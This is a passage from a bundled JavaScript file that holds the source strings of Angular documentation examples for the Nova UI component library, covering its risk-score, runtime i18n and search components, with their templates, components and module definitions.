t='<nui-textbox-number\n    [minValue]="-1"\n    [maxValue]="11"\n    [value]="value"\n    [step]="0.1"\n    (valueChange)="valueChanged($event)"\n></nui-textbox-number>\n\n<br />\n\n<div class="">\n    Default font size without title:\n    <nui-risk-score [level]="value" minLevel="0" maxLevel="10"></nui-risk-score>\n</div>\n\n<div>\n    25px font size with title:\n    <nui-risk-score\n        [level]="value"\n        minLevel="0"\n        maxLevel="10"\n        title="Risk Score"\n        style="font-size: 24px"\n    ></nui-risk-score>\n</div>\n\n<div>\n    40px font size with title-score:\n    <nui-risk-score\n        [level]="value"\n        minLevel="0"\n        maxLevel="10"\n        [title]="value"\n        style="font-size: 40px"\n    ></nui-risk-score>\n</div>\n'},57225:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-risk-score-basic-example",\n    templateUrl: "risk-score-basic.example.component.html",\n})\nexport class RiskScoreBasicExampleComponent {\n    public value: number = 3.7;\n\n    public valueChanged(value: number): void {\n        this.value = value;\n    }\n}\n'},32077:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiRiskScoreModule</code>\n    </li>\n</ul>\n<h1>Basic Usage</h1>\n<p>\n    To use the risk score component add an\n    <code>&lt;nui-risk-score&gt;</code> to your template.\n</p>\n<nui-example-wrapper\n    filenamePrefix="risk-score-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-risk-score-basic-example></nui-risk-score-basic-example>\n</nui-example-wrapper>\n'},90681:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-risk-score-docs-example",\n    templateUrl: "./risk-score-docs.example.component.html",\n})\nexport class RiskScoreDocsExampleComponent {}\n'},25057:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiDocsModule,\n    NuiRiskScoreModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    RiskScoreBasicExampleComponent,\n    RiskScoreDocsExampleComponent,\n} from "./index";\n\nconst routes = [\n    {\n        path: "",\n        component: RiskScoreDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiDocsModule,\n        NuiTextboxModule,\n        NuiRiskScoreModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        RiskScoreBasicExampleComponent,\n        RiskScoreDocsExampleComponent,\n    ],\n    exports: [RouterModule],\n})\nexport default class RiskScoreModule {}\n'},48763:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-example-wrapper\n    filenamePrefix="runtime-i18n-example"\n    exampleTitle="Runtime i18n"\n>\n    <div class="m-5" style="border: 1px lightgrey dashed; padding: 30px">\n        <div class="row">\n            <div class="col-2">\n                <button btn nui-button type="button" (click)="setLocale(\'es\')">\n                    Espa\xf1ol\n                </button>\n            </div>\n            <div class="col-2">\n                <button btn nui-button type="button" (click)="setLocale(\'fr\')">\n                    Franc\xe9s\n                </button>\n            </div>\n            <div class="col-2">\n                <button btn nui-button type="button" (click)="setLocale(\'de\')">\n                    Deutsch\n                </button>\n            </div>\n            <div class="col-6">\n                <button\n                    btn\n                    nui-button\n                    type="button"\n                    (click)="setDefaultLocale()"\n                >\n                    English\n                </button>\n            </div>\n        </div>\n        <div class="row">\n            <div class="d-flex justify-content-center align-items-center">\n                <h1 i18n>Greetings!</h1>\n            </div>\n        </div>\n        <div class="row">\n            <p i18n>\n                This is a random text written to show that runtime translations\n                are actually working. Every single line in this example will be\n                translated using Google Translator.\n            </p>\n        </div>\n        <div class="row">\n            <form>\n                <nui-form-field\n                    caption="First Name"\n                    i18n-caption\n                    hint="Please enter your first name"\n                    i18n-hint\n                >\n                    <nui-textbox\n                        [placeholder]="firstNamePlaceholder"\n                        i18n-placeholder\n                    ></nui-textbox>\n                </nui-form-field>\n                <nui-form-field\n                    caption="Second Name"\n                    i18n-caption\n                    hint="Please enter your second name"\n                    i18n-hint\n                >\n                    <nui-textbox\n                        [placeholder]="lastNamePlaceholder"\n                        i18n-placeholder\n                    ></nui-textbox>\n                </nui-form-field>\n                <nui-form-field\n                    caption="Email address"\n                    i18n-caption\n                    hint="Please enter a valid e-mail address"\n                    i18n-hint\n                >\n                    <nui-textbox\n                        [placeholder]="email"\n                        i18n-placeholder\n                    ></nui-textbox>\n                </nui-form-field>\n                <button btn nui-button type="button" i18n>Submit</button>\n            </form>\n        </div>\n    </div>\n</nui-example-wrapper>\n'},54051:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-runtime-i18n-example",\n    templateUrl: "./runtime-i18n-example.component.html",\n})\nexport class RuntimeI18NExampleComponent implements OnDestroy {\n    public firstNamePlaceholder: string = `John`;\n    public lastNamePlaceholder: string = `Doe`;\n    public email: string = `john.doe@whatever.com`;\n\n    private pageReload() {\n        window.location.reload();\n    }\n\n    public setLocale(locale: string): void {\n        localStorage.setItem("locale", locale);\n        this.pageReload();\n    }\n\n    public setDefaultLocale(): void {\n        localStorage.removeItem("locale");\n        this.pageReload();\n    }\n\n    public ngOnDestroy(): void {\n        localStorage.removeItem("locale");\n    }\n}\n'},53155:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { RuntimeI18NExampleComponent } from "./runtime-i18n-example.component";\n\nconst routes = [\n    {\n        path: "",\n        component: RuntimeI18NExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiDocsModule,\n        NuiFormFieldModule,\n        NuiTextboxModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [RuntimeI18NExampleComponent],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: "runtime-i18n",\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class RuntimeI18NModule {}\n'},60467:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./search-visual-test/search-visual-test.component";\nexport * from "./search-basic/search-basic.example.component";\nexport * from "./search-docs/search-docs.example.component";\nexport * from "./search-placeholder/search-placeholder.example.component";\nexport * from "./search-focus-change/search-focus-change.example.component";\nexport * from "./search-test/search-test.example.component";\nexport * from "./search-input-change/search-input-change.example.component";\nexport * from "./search-on-search-cancel/search-on-search-cancel.example.component";\nexport * from "./search-error-state/search-error-state.example.component";\n'},44641:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<nui-search></nui-search>\n"},40589:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-search-basic-example",\n    templateUrl: "search-basic.example.component.html",\n})\nexport class SearchBasicExampleComponent {}\n'},49865:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiSearchModule</code>\n    </li>\n</ul>\n<h1>Basic Usage</h1>\n<p>\n    To use the search component add an <code>&lt;nui-search&gt;</code> to your\n    template.<br />\n    <b>Note:</b> <code>&lt;nui-search&gt;</code> min-width is 180px and\n    max-width is 400px.\n</p>\n<nui-example-wrapper filenamePrefix="search-basic" exampleTitle="Basic Usage">\n    <nui-search-basic-example></nui-search-basic-example>\n</nui-example-wrapper>\n\n<h1>Placeholder</h1>\n<p>\n    To set the placeholder (string that will be placed as a watermark inside of\n    the search when it\'s empty) for the\n    <code>&lt;nui-search&gt;</code> use the <code>placeholder</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="search-placeholder"\n    exampleTitle="Placeholder"\n>\n    <nui-search-placeholder-example></nui-search-placeholder-example>\n</nui-example-wrapper>\n\n<h1>Invalid State</h1>\n<p>\n    To manually set the search component to an invalid value state, pass true to\n    the isInErrorState input. Note that this input is only about styling.\n</p>\n<nui-example-wrapper\n    filenamePrefix="search-invalid-state"\n    exampleTitle="Invalid state"\n>\n    <nui-search-error-state-example></nui-search-error-state-example>\n</nui-example-wrapper>\n\n<h1>Initial Value and Input Change</h1>\n<p>\n    To subscribe to value change in <code>&lt;nui-search&gt;</code> you can use\n    the <code>(inputChanged)</code> output which emits <code>string</code> when\n    input field value is changed. Optionally, you can set an initial value via\n    the <code>value</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="search-input-change"\n    exampleTitle="Initial Value and Input Change"\n>\n    <nui-search-input-change-example></nui-search-input-change-example>\n</nui-example-wrapper>\n\n<h1>Capture Focus and Focus Change</h1>\n<p>\n    There is a possibility to focus search programmatically. To focus the search\n    pass true to the <code>captureFocus</code> input. Also there is a\n    <code>(focusChange)</code> output that is fired on external focus changes\n    (e.g. initiated by user via UI). Use it if you bind an external input to\n    <code>captureFocus</code> input for matching them both.\n</p>\n<nui-example-wrapper\n    filenamePrefix="search-focus-change"\n    exampleTitle="Capture Focus and Focus Change"\n>\n    <nui-search-focus-change-example></nui-search-focus-change-example>\n</nui-example-wrapper>\n\n<h1>On Search and On Cancel</h1>\n<p>\n    There are two outputs <code>(search)</code> and <code>(cancel)</code>.\n    <code>(cancel)</code> event is fired on each \'cancel\' button click, clears\n    the value and emits it. <code>(search)</code> event is fired when \'search\'\n    button is clicked or on Enter keypress and emits value of the search.\n</p>\n<nui-example-wrapper\n    filenamePrefix="search-on-search-cancel"\n    exampleTitle="On Search and On Cancel"\n>\n    <nui-search-on-search-cancel></nui-search-on-search-cancel>\n</nui-example-wrapper>\n'},73477:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-search-docs-example",\n    templateUrl: "./search-docs.example.component.html",\n})\nexport class SearchDocsExampleComponent {}\n'},11689:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-search [isInErrorState]="isInErrorState"></nui-search>\n'},25605:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='import { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-search-error-state-example",\n    templateUrl: "./search-error-state.example.component.html",\n})\nexport class SearchErrorStateExampleComponent {\n    public isInErrorState = true;\n}\n'},24881:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-search\n    [captureFocus]="isFocused"\n    (focusChange)="onFocusChange($event)"\n></nui-search>\n<button type="button" nui-button class="mt-1" (click)="setFocus()" i18n>\n    Focus Programmatically\n</button>\n'},62973:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-search-focus-change-example",\n    templateUrl: "./search-focus-change.example.component.html",\n})\nexport class SearchFocusChangeExampleComponent {\n    public isFocused: boolean = false;\n\n    constructor(@Inject(ToastService) public toastService: ToastService) {}\n\n    public onFocusChange(focused: boolean): void {\n        this.isFocused = focused;\n        this.toastService.success({\n            message: this.isFocused ? "Focused in!" : "Focused out",\n        });\n    }\n\n    public setFocus(): void {\n        this.isFocused = true;\n        this.toastService.success({ message: "Focused in!" });\n    }\n}\n'},99465:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-search [value]="value" (inputChange)="onInputChange($event)"></nui-search>\n<p i18n class="nui-text-default">Current value is {{ value }}</p>\n'},4165:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-search-input-change-example",\n    templateUrl: "search-input-change.example.component.html",\n})\nexport class SearchInputChangeExampleComponent {\n    public value: string = "example value";\n\n    public onInputChange(value: string): void {\n        this.value = value;\n    }\n}\n'},26113:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-search\n    (cancel)="onCancel($event)"\n    (search)="onSearch($event)"\n></nui-search>\n'},85709:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-search-on-search-cancel",\n    templateUrl: "search-on-search-cancel.example.component.html",\n})\nexport class SearchOnSearchCancelExampleComponent {\n    constructor(@Inject(ToastService) public toastService: ToastService) {}\n\n    public onSearch(value: string): void {\n        this.toastService.success({\n            message: `OnSearch triggered. Current value is: ${value}`,\n        });\n    }\n    public onCancel(value: string): void {\n        this.toastService.success({\n            message: `OnCancel triggered. Current value is: ${value}`,\n        });\n    }\n}\n'},13979:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-search i18n-placeholder placeholder="Type here to search..."></nui-search>\n'},67683:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-search-placeholder-example",\n    templateUrl: "search-placeholder.example.component.html",\n})\nexport class SearchPlaceholderExampleComponent {\n    public placeholder = "Search something...";\n}\n'},23793:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-search\n    id="nui-demo-search"\n    [name]="name"\n    [value]="value"\n    [captureFocus]="captureFocus"\n    [isInErrorState]="isInErrorState"\n    (focusChange)="onFocusChange($event)"\n    (inputChange)="onInputChange($event)"\n    (search)="onSearch($event)"\n    (cancel)="onCancel($event)"\n>\n</nui-search>\n<div>\n    <h3>Search Result:</h3>\n    <div>\n        <p [innerHTML]="stringToSearch | nuiHighlight : searchKey"></p>\n    </div>\n</div>\n<h4>Input parameters:</h4>\n<form>\n    <div>\n        <div>\n            <code> captureFocus </code>\n            <span> : {{ captureFocus ? "true" : "false" }}</span>\n        </div>\n        <button\n            nui-button\n            type="button"\n            id="nui-demo-search-set-focus-btn"\n            displayStyle="default"\n            (click)="setFocus()"\n        >\n            Set Focus for {{ interval / 1000 }} sec.\n        </button>\n    </div>\n</form>\n'},20125:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-search-example",\n    templateUrl: "./search-test.example.component.html",\n})\nexport class SearchTestExampleComponent {\n    public active = false;\n    public captureFocus = true;\n    public name = "example-name";\n    public searchKey: string;\n    public stringToSearch = `\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec efficitur rutrum lacus id vulputate.\n        Integer eu ex eu augue 